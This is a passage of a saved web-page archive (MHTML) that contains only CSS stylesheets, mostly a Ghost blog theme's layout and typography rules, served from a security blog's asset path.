.App-header { background-color: rgb(40, 44, 52); min-height: 100vh; display=
: flex; flex-direction: column; align-items: center; justify-content: cente=
r; font-size: calc(10px + 2vmin); color: white; }

.App-link { color: rgb(97, 218, 251); }

@-webkit-keyframes App-logo-spin {=20
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes App-logo-spin {=20
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-010dd9cf-1eac-4bc5-959f-fe6af15db15e@mhtml.blink

@charset "utf-8";

.fluid-width-video-container { flex-grow: 1; width: 100%; }

.fluid-width-video-wrapper { width: 100%; position: relative; padding: 0px;=
 }

.fluid-width-video-wrapper iframe, .fluid-width-video-wrapper object, .flui=
d-width-video-wrapper embed { position: absolute; top: 0px; left: 0px; widt=
h: 100%; height: 100%; }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://pwning.tech/assets/built/screen.css?v=4edf52f83a

@charset "utf-8";

a, abbr, acronym, address, applet, article, aside, audio, big, blockquote, =
body, canvas, caption, cite, code, dd, del, details, dfn, div, dl, dt, em, =
embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, =
header, hgroup, html, iframe, img, ins, kbd, label, legend, li, mark, menu,=
 nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, s=
trike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time,=
 tr, tt, ul, var, video { border: 0px; font-style: inherit; font-variant: i=
nherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; =
font-family: inherit; font-optical-sizing: inherit; font-kerning: inherit; =
font-feature-settings: inherit; font-variation-settings: inherit; font-size=
: 100%; margin: 0px; padding: 0px; vertical-align: baseline; }

body { line-height: 1; }

ol, ul { list-style: none; }

blockquote, q { quotes: none; }

blockquote::after, blockquote::before, q::after, q::before { content: none;=
 }

img { display: block; height: auto; max-width: 100%; }

html { text-size-adjust: 100%; box-sizing: border-box; font-family: sans-se=
rif; }

*, ::after, ::before { box-sizing: inherit; }

a { background-color: transparent; }

a:active, a:hover { outline: 0px; }

b, strong { font-weight: 700; }

dfn, em, i { font-style: italic; }

h1 { font-size: 2em; margin: 0.67em 0px; }

small { font-size: 80%; }

sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-ali=
gn: baseline; }

sup { top: -0.5em; }

sub { bottom: -0.25em; }

img { border: 0px; }

svg:not(:root) { overflow: hidden; }

mark { background-color: rgb(253, 255, 182); }

code, kbd, pre, samp { font-family: monospace, monospace; font-size: 1em; }

kbd { background: rgb(246, 248, 250); border: 1px solid rgba(124, 139, 154,=
 0.25); border-radius: 6px; box-shadow: rgba(124, 139, 154, 0.25) 0px -1px =
0px inset; font-family: var(--font-mono); font-size: 1.5rem; padding: 3px 5=
px; }

@media (max-width: 600px) {
  kbd { font-size: 1.3rem; }
}

button, input, optgroup, select, textarea { color: inherit; font: inherit; =
margin: 0px; }

button { border: none; overflow: visible; }

button, select { text-transform: none; }

button, html input[type=3D"button"], input[type=3D"reset"], input[type=3D"s=
ubmit"] { appearance: button; cursor: pointer; }

button[disabled], html input[disabled] { cursor: default; }

input { line-height: normal; }

input:focus { outline: none; }

input[type=3D"checkbox"], input[type=3D"radio"] { box-sizing: border-box; p=
adding: 0px; }

input[type=3D"number"]::-webkit-inner-spin-button, input[type=3D"number"]::=
-webkit-outer-spin-button { height: auto; }

input[type=3D"search"] { appearance: textfield; box-sizing: content-box; }

input[type=3D"search"]::-webkit-search-cancel-button, input[type=3D"search"=
]::-webkit-search-decoration { appearance: none; }

legend { border: 0px; padding: 0px; }

textarea { overflow: auto; }

table { border-collapse: collapse; border-spacing: 0px; }

td, th { padding: 0px; }

html { -webkit-tap-highlight-color: rgba(0, 0, 0, 0); font-size: 62.5%; }

body { text-rendering: optimizelegibility; -webkit-font-smoothing: antialia=
sed; background: rgb(255, 255, 255); color: var(--color-darkgrey); font-fam=
ily: var(--font-sans); font-size: 1.6rem; font-style: normal; font-weight: =
400; letter-spacing: 0px; line-height: 1.6em; }

::selection { background: rgb(218, 242, 253); text-shadow: none; }

hr { border-width: 1px 0px 0px; border-right-style: initial; border-bottom-=
style: initial; border-left-style: initial; border-right-color: initial; bo=
rder-bottom-color: initial; border-left-color: initial; border-image: initi=
al; border-top-style: solid; border-top-color: rgb(240, 240, 240); display:=
 block; height: 1px; margin: 2.5em 0px 3.5em; padding: 0px; position: relat=
ive; width: 100%; }

audio, canvas, iframe, img, svg, video { vertical-align: middle; }

fieldset { border: 0px; margin: 0px; padding: 0px; }

textarea { resize: vertical; }

ol, ul { padding-left: 1.3em; padding-right: 1.5em; }

ol ol, ol ul, ul ol, ul ul { margin: 0.5em 0px 1em; }

ul { list-style: disc; }

ol { list-style: decimal; }

ol, ul { max-width: 100%; }

li { line-height: 1.6em; padding-left: 0.3em; }

li + li { margin-top: 0.5em; }

dt { color: rgb(218, 242, 253); float: left; font-weight: 500; margin: 0px =
20px 0px 0px; text-align: right; width: 120px; }

dd { margin: 0px 0px 5px; text-align: left; }

blockquote { border-left: rgb(218, 242, 253); margin: 1.5em 0px; padding: 0=
px 1.6em; }

blockquote small { display: inline-block; font-size: 0.9em; margin: 0.8em 0=
px 0.8em 1.5em; opacity: 0.8; }

blockquote small::before { content: "=E2=80=94=C2=A0"; }

blockquote cite { font-weight: 700; }

blockquote cite a { font-weight: 400; }

a { color: rgb(21, 23, 26); text-decoration: none; }

h1, h2, h3, h4, h5, h6 { text-rendering: optimizelegibility; font-weight: 6=
00; letter-spacing: -0.01em; line-height: 1.15; margin-top: 0px; }

h1 { font-size: 4.8rem; font-weight: 700; letter-spacing: -0.015em; margin:=
 0px 0px 0.5em; }

@media (max-width: 600px) {
  h1 { font-size: 2.8rem; }
}

h2 { font-size: 2.8rem; font-weight: 700; margin: 1.5em 0px 0.5em; }

@media (max-width: 600px) {
  h2 { font-size: 2.3rem; }
}

h3 { font-size: 2.4rem; font-weight: 600; margin: 1.5em 0px 0.5em; }

@media (max-width: 600px) {
  h3 { font-size: 1.7rem; }
}

h4 { font-size: 2rem; margin: 1.5em 0px 0.5em; }

@media (max-width: 600px) {
  h4 { font-size: 1.7rem; }
}

h5 { font-size: 2rem; }

h5, h6 { margin: 1.5em 0px 0.5em; }

h6 { font-size: 1.8rem; }

:root { --color-green: #a4d037; --color-yellow: #fecd35; --color-red: #f052=
30; --color-darkgrey: #15171a; --color-midgrey: #738a94; --color-lightgrey:=
 #f1f1f1; --color-secondary-text: #979797; --color-border: #e1e1e1; --color=
-wash: #e5eff5; --color-darkmode: #151719; --font-sans: -apple-system,Blink=
MacSystemFont,"Segoe UI","Roboto","Oxygen","Ubuntu","Cantarell","Fira Sans"=
,"Droid Sans","Helvetica Neue",sans-serif; --font-serif: Georgia,Times,seri=
f; --font-mono: Menlo,Courier,monospace; }

.viewport { display: flex; flex-direction: column; min-height: 100vh; }

.site-content { flex-grow: 1; }

.outer { padding: 0px max(4vmin, 20px); position: relative; }

.inner { margin: 0px auto; max-width: 1200px; width: 100%; }

.site-header { background: var(--ghost-accent-color); color: rgb(255, 255, =
255); position: relative; }

.site-header-cover { inset: 0px; height: 100%; object-fit: cover; position:=
 absolute; width: 100%; }

.site-header-content { align-items: center; color: var(--color-darkgrey); d=
isplay: flex; padding-bottom: 19vmin; padding-top: calc(19vmin + 44px); pos=
ition: relative; text-align: center; z-index: 100; }

.has-cover .site-header-content { background-color: var(--ghost-accent-colo=
r); color: rgb(255, 255, 255); min-height: 560px; }

.site-header-content.left-aligned { padding-bottom: 0px; text-align: left; =
}

.has-cover .site-header-content.left-aligned { align-items: flex-end; paddi=
ng-bottom: max(4vmin, 32px); }

.site-header-content.no-content { padding-bottom: 2vmin; padding-top: 0px; =
}

.site-header-inner { position: relative; }

.site-header-content.left-aligned .site-header-inner { align-items: flex-st=
art; }

.site-logo { flex-shrink: 0; margin: 0px auto; max-height: 120px; }

.site-header-content.left-aligned .site-logo { margin-left: 0px; margin-rig=
ht: auto; max-height: 96px; }

.site-title { font-size: 5rem; font-weight: 800; margin: 0px; padding: 0px;=
 z-index: 10; }

.has-serif-title .site-title { font-family: var(--font-serif); }

.has-cover .site-title { font-size: 6rem; }

.site-header-content.left-aligned .site-title { font-size: 4.4rem; }

.has-cover .site-header-content.left-aligned .site-title { font-size: 4.6re=
m; }

.site-description { display: inline-block; font-size: 6rem; font-weight: 70=
0; line-height: 1.1; max-width: 960px; z-index: 10; }

:is(.site-logo, .site-title) + .site-description { font-size: 2.4rem; font-=
weight: 400; line-height: 1.4; margin-top: 16px; max-width: 640px; }

.site-logo + .site-description { margin-top: 20px; }

.site-title + .site-description { color: var(--color-secondary-text); }

.has-cover .site-description { color: rgb(255, 255, 255); letter-spacing: -=
0.005em; }

.has-cover :is(.site-logo, .site-title) + .site-description { font-size: 2.=
4rem; }

.has-cover .site-header-content.left-aligned :is(.site-logo, .site-title) +=
 .site-description { font-size: 2.2rem; }

@media (min-width: 992px) {
  .is-head-stacked.has-cover .site-header-content { padding-top: calc(19vmi=
n + 120px); }
}

@media (max-width: 991px) {
  .site-header-content { padding-top: calc(19vmin + 32px); }
}

@media (max-width: 767px) {
  .has-cover .site-header-content { min-height: 240px; }
  .site-header-inner { gap: 16px; }
  .site-logo { max-width: 60%; }
  .site-title { font-size: 3.4rem !important; }
  .site-description { font-size: 2.2rem !important; }
  .site-logo + .site-description, .site-title + .site-description { margin-=
top: 12px !important; }
}

.gh-head { background-color: rgb(255, 255, 255); font-size: 1.6rem; height:=
 88px; line-height: 1.3em; }

.has-cover:not(.home-template) .gh-head { background-color: var(--ghost-acc=
ent-color); color: rgb(255, 255, 255); }

:is(.home-template, .paged:not(.tag-template):not(.author-template)).has-co=
ver .gh-head { background-color: transparent; color: rgb(255, 255, 255); le=
ft: 0px; position: absolute; right: 0px; top: 0px; z-index: 2000; }

.gh-head a { text-decoration: none; }

.gh-head-inner { align-items: center; column-gap: 40px; display: grid; grid=
-auto-flow: dense; height: 100%; }

.gh-head-inner, .is-head-left-logo .gh-head-inner { grid-template-columns: =
auto 1fr auto; }

.is-head-left-logo.home-template .gh-head:not(.is-header-hidden) .gh-head-l=
ogo { display: none; }

.is-head-left-logo.home-template .gh-head:not(.is-header-hidden) .gh-head-m=
enu { margin-left: -40px; }

@media (min-width: 992px) {
  .is-head-left-logo .gh-head-menu { margin-left: 16px; margin-right: 64px;=
 }
}

.is-head-middle-logo .gh-head-inner { grid-template-columns: 1fr auto 1fr; =
}

.is-head-middle-logo .gh-head-brand { grid-column-start: 2; }

@media (min-width: 992px) {
  .is-head-middle-logo .gh-head-menu { margin-right: 64px; }
}

.is-head-stacked .gh-head { height: auto; }

.is-head-stacked .gh-head-inner { grid-template-columns: 1fr auto 1fr; }

.is-head-stacked .gh-head-brand { grid-column-start: 2; grid-row-start: 1; =
}

@media (min-width: 992px) {
  .is-head-stacked .gh-head-inner { padding: 0px; }
  .is-head-stacked .gh-head-brand { align-items: center; display: flex; hei=
ght: 80px; position: relative; }
  .is-head-stacked .gh-head-menu { grid-column: 1 / 4; grid-row-start: 2; h=
eight: 56px; justify-content: center; margin: 0px 48px; }
  .is-head-stacked .gh-head-menu::after, .is-head-stacked .gh-head-menu::be=
fore { background-color: var(--color-lightgrey); content: ""; height: 1px; =
left: 0px; position: absolute; top: 80px; width: 100%; }
  .is-head-stacked.has-cover .gh-head-menu::after, .is-head-stacked.has-cov=
er .gh-head-menu::before { background-color: rgba(255, 255, 255, 0.2); }
  .is-head-stacked .gh-head-menu::after { top: 136px; }
  .is-head-stacked .gh-head-actions { grid-column: 1 / 4; grid-row-start: 1=
; justify-content: space-between; }
}

.gh-head-brand { align-items: center; display: flex; height: 40px; word-bre=
ak: break-all; }

.gh-head-logo { color: inherit; display: block; font-size: 2.6rem; font-wei=
ght: 800; letter-spacing: -0.02em; white-space: nowrap; }

.gh-head-logo.no-image { margin-top: -5px; }

.has-cover .gh-head-logo { color: rgb(255, 255, 255); }

.gh-head-logo img { max-height: 40px; }

.gh-head-menu { align-items: center; display: flex; font-weight: 500; margi=
n-top: 1px; }

.gh-head-menu .nav { align-items: center; display: inline-flex; flex-wrap: =
wrap; gap: 32px; list-style: none; margin: 0px; padding: 0px; }

.gh-head-menu .nav li { margin: 0px; padding: 0px; }

.gh-head-menu .nav a { color: inherit; display: inline-block; line-height: =
1.7; }

.gh-head-menu .nav a:hover { opacity: 0.9; }

.gh-head-menu .nav-more-toggle { background-color: transparent; font-size: =
inherit; height: 30px; margin: 0px -6px; padding: 0px; position: relative; =
text-transform: inherit; width: 30px; }

.gh-head-menu .nav-more-toggle svg { height: 24px; width: 24px; }

@media (min-width: 992px) {
  body:not(.is-dropdown-loaded) .gh-head-menu .nav > li { opacity: 0; }
}

.gh-dropdown { background-color: rgb(255, 255, 255); border-radius: 5px; bo=
x-shadow: rgba(0, 0, 0, 0.04) 0px 0px 0px 1px, rgba(0, 0, 0, 0.15) 0px 7px =
20px -5px; margin-top: 24px; opacity: 0; padding: 12px 0px; position: absol=
ute; right: -16px; text-align: left; top: 100%; transform: translate3d(0px,=
 6px, 0px); transition: opacity 0.3s ease 0s, transform 0.2s ease 0s; visib=
ility: hidden; width: 200px; z-index: 90; }

.is-head-middle-logo .gh-dropdown { left: -24px; right: auto; }

.is-dropdown-mega .gh-dropdown { column-gap: 40px; display: grid; grid-auto=
-flow: column; grid-template-columns: 1fr 1fr; min-width: 320px; padding: 2=
0px 32px; }

.is-dropdown-open .gh-dropdown { opacity: 1; transform: translateY(0px); vi=
sibility: visible; }

.gh-head-menu .gh-dropdown li a { color: rgb(21, 23, 26); display: block; p=
adding: 6px 20px; }

.is-dropdown-mega .gh-dropdown li a { padding: 8px 0px; }

.gh-social { align-items: center; display: flex; gap: 20px; }

.gh-social-link { color: inherit; line-height: 0; }

.gh-social-link:hover { opacity: 0.9; }

.gh-social-link svg { height: 18px; width: 18px; }

.gh-head-actions { align-items: center; display: flex; gap: 24px; justify-c=
ontent: flex-end; list-style: none; text-align: right; }

.gh-head-members { align-items: center; display: flex; gap: 20px; }

.gh-head-link { color: inherit; font-weight: 500; }

.gh-head-button { align-items: center; background: var(--ghost-accent-color=
); border-radius: 48px; color: rgb(255, 255, 255); display: inline-flex; fo=
nt-size: 1.6rem; font-weight: 600; height: 44px; justify-content: center; l=
etter-spacing: -0.005em; padding: 8px 20px; }

.has-cover .gh-head-button { background: rgb(255, 255, 255); color: var(--c=
olor-darkgrey); }

@media (max-width: 767px) {
  .gh-head-members { flex-direction: column-reverse; gap: 16px; width: 100%=
; }
}

.gh-search { align-items: center; background-color: transparent; border: 0p=
x; cursor: pointer; display: inline-flex; height: 32px; justify-content: ce=
nter; outline: none; padding: 0px; width: 32px; }

.gh-search:hover { opacity: 0.9; }

.gh-head-brand .gh-search { margin-right: 8px; }

.gh-head-actions .gh-search { margin-right: -4px; }

@media (max-width: 767px) {
  .gh-head-actions .gh-search { display: none; }
}

@media (min-width: 768px) {
  .gh-head-brand .gh-search { display: none; }
}

.gh-burger { appearance: none; background-color: transparent; border: 0px; =
cursor: pointer; display: none; height: 30px; margin-right: -3px; padding: =
0px; position: relative; width: 30px; }

.gh-burger::after, .gh-burger::before { background-color: var(--color-darkg=
rey); content: ""; height: 1px; left: 3px; position: absolute; transition: =
all 0.2s cubic-bezier(0.04, 0.04, 0.12, 0.96) 0.1008s; width: 24px; }

.has-cover .gh-burger::after, .has-cover .gh-burger::before { background-co=
lor: rgb(255, 255, 255); }

.gh-burger::before { top: 11px; }

.gh-burger::after { bottom: 11px; }

.gh-head-open .gh-burger::before { top: 15px; transform: rotate(45deg); }

.gh-head-open .gh-burger::after { bottom: 14px; transform: rotate(-45deg); =
}

@media (max-width: 767px) {
  #gh-head { height: 64px; }
  #gh-head .gh-head-inner { gap: 48px; grid-template-columns: 1fr; grid-tem=
plate-rows: auto 1fr auto; }
  #gh-head .gh-head-brand { align-items: center; display: grid; grid-column=
-start: 1; grid-template-columns: 1fr auto auto; height: 64px; }
  #gh-head .gh-head-logo { font-size: 2.2rem; }
  #gh-head .gh-head-brand .gh-search { margin-left: -6px; }
  #gh-head .gh-burger { display: block; }
  #gh-head .gh-head-actions, #gh-head .gh-head-menu { justify-content: cent=
er; opacity: 0; position: fixed; visibility: hidden; }
  #gh-head .gh-head-menu { margin: 0px; transform: translateY(0px); transit=
ion: none 0s ease 0s; }
  #gh-head .nav { align-items: center; gap: 16px; line-height: 1.4; }
  #gh-head .nav a { font-size: 2.6rem; font-weight: 600; text-transform: no=
ne; }
  #gh-head .nav li { opacity: 0; transform: translateY(-4px); }
  #gh-head :is(.gh-head-button, .gh-head-link) { opacity: 0; transform: tra=
nslateY(8px); }
  #gh-head .gh-head-button { font-size: 1.8rem; opacity: 0; text-transform:=
 none; transform: translateY(8px); width: 100%; }
  .gh-head-open #gh-head { height: 100%; inset: 0px; overflow-y: scroll; po=
sition: fixed; z-index: 3999999; }
  .gh-head-open.has-cover #gh-head, .gh-head-open.has-cover #gh-head .gh-he=
ad-actions { background-color: var(--ghost-accent-color); }
  .gh-head-open #gh-head .gh-head-actions, .gh-head-open #gh-head .gh-head-=
menu { opacity: 1; position: static; visibility: visible; }
  .gh-head-open #gh-head .nav { display: flex; flex-direction: column; }
  .gh-head-open #gh-head .nav li { opacity: 1; transform: translateY(0px); =
transition: transform 0.2s ease 0s, opacity 0.2s ease 0s; }
  .gh-head-open #gh-head .gh-head-actions { align-items: center; background=
-color: rgb(255, 255, 255); bottom: 0px; display: inline-flex; flex-directi=
on: column; gap: 12px; left: 0px; padding: max(4vmin, 20px) 0px max(4vmin, =
28px); position: sticky; right: 0px; }
  .gh-head-open #gh-head :is(.gh-head-button, .gh-head-link) { opacity: 1; =
transform: translateY(0px); transition: transform 0.4s ease 0.2s, opacity 0=
.4s ease; }
  .gh-head-open #gh-head .gh-head-link { transition-delay: 0.4s; }
}

.post-feed { display: grid; gap: 4.8vmin 4vmin; grid-template-columns: repe=
at(6, 1fr); padding: max(4.8vmin, 36px) 0px 0px; position: relative; }

:is(.tag-template, .author-template) .post-feed { margin-top: 4vmin; }

@media (max-width: 991px) {
  .post-feed { grid-template-columns: 1fr 1fr; }
}

@media (max-width: 767px) {
  .post-feed { gap: 40px; grid-template-columns: 1fr; }
}

.post-card { background-size: cover; display: flex; flex-direction: column;=
 grid-column: span 2 / auto; position: relative; word-break: break-word; }

.post-card-image-link { display: block; margin-bottom: 32px; overflow: hidd=
en; position: relative; }

.post-card-image-link::after { content: ""; display: block; padding-bottom:=
 55%; }

.post-card[class*=3D"post-access-"] .post-card-image-link::after { backdrop=
-filter: blur(3px); background-color: rgba(0, 0, 0, 0.5); }

.post-card.keep-ratio[class*=3D"post-access-"] .post-card-image-link::after=
 { inset: 0px; padding-bottom: 0px; position: absolute; }

.post-card.keep-ratio:not(.post-card-large):not(.post-card-full) .post-card=
-image-link::after { padding-bottom: 0px; }

.post-card-image { background: var(--color-lightgrey) no-repeat center cent=
er; height: 100%; inset: 0px; object-fit: cover; position: absolute; width:=
 100%; }

.post-card.keep-ratio:not(.post-card-large):not(.post-card-full) .post-card=
-image { position: static; }

.post-card-access { align-items: center; color: rgb(255, 255, 255); display=
: flex; font-size: 1.5rem; font-weight: 600; gap: 4px; inset: 0px; justify-=
content: center; position: absolute; z-index: 10; }

.post-card-content-link { color: var(--color-darkgrey); display: block; pos=
ition: relative; }

.post-card-content-link:hover { text-decoration: none; }

.post-feed .no-image .post-card-content-link { padding: 0px; }

.no-image .post-card-header { margin-top: 0px; }

.post-card-tags { align-items: center; color: var(--color-secondary-text); =
display: flex; font-size: 1.4rem; font-weight: 600; gap: 12px; letter-spaci=
ng: -0.005em; line-height: 1; margin: 0px 0px 10px; }

.post-card-featured { align-items: center; color: var(--ghost-accent-color)=
; display: flex; gap: 3px; padding-left: 18px; position: relative; }

.post-card-featured svg { left: 0px; position: absolute; }

.post-card-title { font-size: 2.6rem; font-weight: 800; line-height: 1.2; m=
argin: 0px; }

.post-card-content-link:hover .post-card-title { opacity: 0.9; }

.no-image .post-card-title { margin-top: 0px; }

.has-serif-title .post-card-title { font-family: var(--font-serif); letter-=
spacing: -0.005em; }

.post-card-title svg { margin-left: -1px; margin-top: -3px; }

.post-card-content { display: flex; flex-direction: column; flex-grow: 1; }

.post-card-excerpt { -webkit-line-clamp: 3; -webkit-box-orient: vertical; d=
isplay: -webkit-box; font-size: 1.6rem; line-height: 1.5; margin-top: 12px;=
 max-width: 720px; overflow-y: hidden; word-break: break-word; }

.has-sans-body .post-card-excerpt { font-family: var(--font-sans); }

.post-card:not(.post-card-large):not(.post-card-full):not(.dynamic):not(.no=
-image) .post-card-excerpt { -webkit-line-clamp: 2; }

:is(.tag-template, .author-template) .post-card-excerpt { margin-top: 6px; =
}

.post-card-meta { color: var(--color-secondary-text); font-size: 1.3rem; ma=
rgin-top: 12px; padding: 0px; }

.post-card-meta, .post-card-meta > * { align-items: center; display: flex; =
gap: 6px; }

.post-card-meta > * + :not(script)::before { background-color: var(--color-=
secondary-text); border-radius: 50%; content: ""; height: 2px; width: 2px; =
}

.post-card-meta .sep { margin: 0px 4px; }

.author-profile-image { background: rgb(255, 255, 255); border-radius: 100%=
; display: block; height: 100%; object-fit: cover; width: 100%; }

.author-list { display: flex; flex-wrap: wrap; list-style: none; margin: 0p=
x 0px 0px 4px; padding: 0px; }

.author-list-item { flex-shrink: 0; margin: 0px; padding: 0px; position: re=
lative; }

@media (min-width: 1001px) {
  .post-card-large { gap: 4vmin; border-top: 0px; display: grid; grid-colum=
n: span 6 / auto; grid-template-columns: repeat(3, 1fr); }
  .post-card-large:not(.no-image) .post-card-header { margin-top: 0px; }
  .post-card-large .post-card-image-link { grid-column: span 2 / auto; marg=
in-bottom: 0px; position: relative; }
  .post-card-large .post-card-content { grid-column: span 1 / auto; }
  .post-card-large.no-image .post-card-content { grid-column: span 2 / auto=
; }
  .post-card-large .post-card-image { height: 100%; position: absolute; wid=
th: 100%; }
  .post-card-large .post-card-tags { margin-bottom: 12px; }
  .post-card-large .post-card-title { font-size: 4.4rem; line-height: 1.05;=
 margin-top: 0px; }
  .post-card-large .post-card-excerpt { margin-top: 16px; }
  .post-card-full { grid-column: span 6 / auto; }
  .post-card-full .post-card-image-link { margin-bottom: 40px; }
  .post-card-full .post-card-tags { margin-bottom: 14px; }
  .post-card-full .post-card-title { font-size: 6.4rem; line-height: 0.95; =
}
  .post-card-full .post-card-excerpt { font-size: 1.8rem; margin-top: 20px;=
 }
  .post-card-large + .post-card-large:nth-child(2n) { margin: 32px 0px; }
  .post-card-large + .post-card-large:nth-child(2n) .post-card-content { or=
der: -1; }
  .post-card.dynamic { grid-column: span 3 / auto; }
  .post-card.dynamic .post-card-title { font-size: 3rem; }
}

.pagination { align-items: center; display: none; grid-template-columns: 1f=
r auto 1fr; margin-top: 8vmin; }

html.no-infinite-scroll .pagination { display: grid; }

.pagination a { font-size: 1.7rem; font-weight: 600; }

.pagination .page-number { color: var(--color-secondary-text); grid-column-=
start: 2; }

.pagination .older-posts { grid-column-start: 3; text-align: right; }

@media (max-width: 767px) {
  .pagination .page-number { display: none; }
}

.article { padding: max(8vmin, 40px) 0px max(8vmin, 64px); word-break: brea=
k-word; }

.page-template .article { padding-top: max(12vmin, 64px); }

.article-header { padding: 0px 0px max(6.4vmin, 40px); }

.page-template .article-header { padding-bottom: max(3.2vmin, 28px); }

.article-tag { font-size: 1.6rem; margin-bottom: 16px; }

.article-tag a { color: var(--color-secondary-text); }

.article-title { color: var(--color-darkgrey); font-size: clamp(3.2rem, 5vw=
, 5.2rem); font-weight: 800; line-height: 1.05; margin-bottom: 0px; }

.has-serif-title .article-title { font-family: var(--font-serif); }

.article-excerpt { color: var(--color-darkgrey); font-size: 2rem; line-heig=
ht: 1.45; margin-top: 20px; max-width: 720px; }

.gh-canvas .article-image { grid-column: wide-start / wide-end; margin: max=
(6.4vmin, 40px) 0px 0px; width: 100%; }

.image-full .article-image { grid-column: full-start / full-end; }

.image-small .article-image { grid-column: main-start / main-end; }

.gh-canvas .article-image img { display: block; margin-left: auto; margin-r=
ight: auto; width: 100%; }

@media (max-width: 767px) {
  .article-excerpt { font-size: 1.7rem; margin-top: 14px; }
}

.gh-canvas { display: grid; grid-template-columns: [full-start] minmax(max(=
4vmin, 20px), auto) [wide-start] minmax(auto, 240px) [main-start] min(720px=
, 100% - max(8vmin, 40px)) [main-end] minmax(auto, 240px) [wide-end] minmax=
(max(4vmin, 20px), auto) [full-end]; }

.gh-canvas > * { grid-column: main-start / main-end; }

.kg-width-wide { grid-column: wide-start / wide-end; }

.kg-width-full { grid-column: full-start / full-end; }

.kg-width-full img { width: 100%; }

.gh-content > * + * { margin-bottom: 0px; margin-top: max(3.2vmin, 24px); }

.gh-content > [id] { color: var(--color-darkgrey); margin: 0px; }

.has-serif-title .gh-content > [id] { font-family: var(--font-serif); }

.gh-content > [id]:not(:first-child) { margin: 2em 0px 0px; }

.gh-content > [id] + * { margin-top: 1.5rem !important; }

.gh-content > blockquote, .gh-content > hr { margin-top: max(4.8vmin, 32px)=
; position: relative; }

.gh-content > blockquote + *, .gh-content > hr + * { margin-top: max(4.8vmi=
n, 32px) !important; }

.gh-content a { color: var(--ghost-accent-color); text-decoration: underlin=
e; word-break: break-word; }

.gh-content > blockquote:not([class]), .gh-content > dl, .gh-content > ol, =
.gh-content > p, .gh-content > ul { font-family: var(--font-serif); font-si=
ze: 2rem; font-weight: 400; line-height: 1.6em; }

.gh-content .kg-callout-card .kg-callout-text, .gh-content .kg-toggle-card =
.kg-toggle-content > ol, .gh-content .kg-toggle-card .kg-toggle-content > p=
, .gh-content .kg-toggle-card .kg-toggle-content > ul { font-family: var(--=
font-serif); font-size: 1.9rem; font-weight: 400; line-height: 1.6em; }

.gh-content .kg-product-card .kg-product-card-description > ol, .gh-content=
 .kg-product-card .kg-product-card-description > p, .gh-content .kg-product=
-card .kg-product-card-description > ul { font-size: 1.7rem; line-height: 1=
.6em; }

.gh-content .kg-callout-card .kg-callout-emoji { font-size: 2.1rem; line-he=
ight: 1.4em; }

.gh-content .kg-toggle-card .kg-toggle-heading-text { font-size: 2rem; }

.has-sans-body .gh-content .kg-callout-card .kg-callout-text, .has-sans-bod=
y .gh-content .kg-toggle-card .kg-toggle-content > ol, .has-sans-body .gh-c=
ontent .kg-toggle-card .kg-toggle-content > p, .has-sans-body .gh-content .=
kg-toggle-card .kg-toggle-content > ul, .has-sans-body .gh-content > blockq=
uote, .has-sans-body .gh-content > dl, .has-sans-body .gh-content > ol, .ha=
s-sans-body .gh-content > p, .has-sans-body .gh-content > ul { font-family:=
 var(--font-sans); }

.gh-content .kg-product-card .kg-product-card-description > ol, .gh-content=
 .kg-product-card .kg-product-card-description > ul, .gh-content .kg-toggle=
-card .kg-toggle-content > ol, .gh-content .kg-toggle-card .kg-toggle-conte=
nt > ul, .gh-content > dl, .gh-content > ol, .gh-content > ul { padding-lef=
t: 1.9em; }

.gh-content > blockquote:not([class]) { font-style: italic; padding: 0px; p=
osition: relative; }

.gh-content > blockquote:not([class])::before { background: var(--ghost-acc=
ent-color); bottom: 0px; content: ""; left: -1.5em; position: absolute; top=
: 0px; width: 0.3rem; }

.gh-content :not(pre) > code { background: rgb(240, 246, 249); border: 1px =
solid rgb(225, 234, 239); border-radius: 0.25em; color: rgb(21, 23, 26); fo=
nt-size: 0.9em; line-height: 1em; padding: 0.15em 0.4em; vertical-align: mi=
ddle; font-weight: 400 !important; }

.gh-content pre { background: var(--color-darkgrey); border-radius: 5px; bo=
x-shadow: rgba(0, 0, 0, 0.1) 0px 2px 6px -2px, rgba(0, 0, 0, 0.4) 0px 0px 1=
px; color: var(--color-wash); font-size: 1.4rem; line-height: 1.5em; overfl=
ow: auto; padding: 16px 20px; }

@media (max-width: 650px) {
  .gh-content .kg-callout-card .kg-callout-text, .gh-content .kg-toggle-car=
d .kg-toggle-content > ol, .gh-content .kg-toggle-card .kg-toggle-content >=
 p, .gh-content .kg-toggle-card .kg-toggle-content > ul, .gh-content > bloc=
kquote:not([class]), .gh-content > dl, .gh-content > ol, .gh-content > p, .=
gh-content > ul { font-size: 1.8rem; }
  .gh-content .kg-product-card .kg-product-card-description > ol, .gh-conte=
nt .kg-product-card .kg-product-card-description > p, .gh-content .kg-produ=
ct-card .kg-product-card-description > ul { font-size: 1.6rem; }
  .gh-content blockquote:not([class])::before { left: min(-4vmin, -20px); }
}

.gh-content .kg-card + :not(.kg-card), .gh-content :not(.kg-card):not([id])=
 + .kg-card { margin-bottom: 0px; margin-top: 6vmin; }

.kg-embed-card { align-items: center; display: flex; flex-direction: column=
; width: 100%; }

.kg-image-card img { margin: auto; }

.has-serif-title .kg-toggle-card .kg-toggle-heading-text { font-family: var=
(--font-serif); }

.gh-content .kg-callout-card-accent a { text-decoration: underline; }

.kg-blockquote-alt { color: var(--color-midgrey); font-family: var(--font-s=
erif); }

.has-sans-body .kg-blockquote-alt { font-family: var(--font-sans); }

.kg-card.kg-header-card.kg-style-dark { background: var(--color-darkgrey); =
}

.kg-header-card.kg-style-light h2.kg-header-card-header { color: rgb(10, 11=
, 12); }

.has-serif-title .kg-header-card h2.kg-header-card-header { font-family: va=
r(--font-serif); }

figcaption { color: rgba(0, 0, 0, 0.5); font-size: 1.3rem; line-height: 1.4=
em; padding: 1.5rem 1.5rem 0px; text-align: center; }

figcaption strong { color: rgba(0, 0, 0, 0.8); }

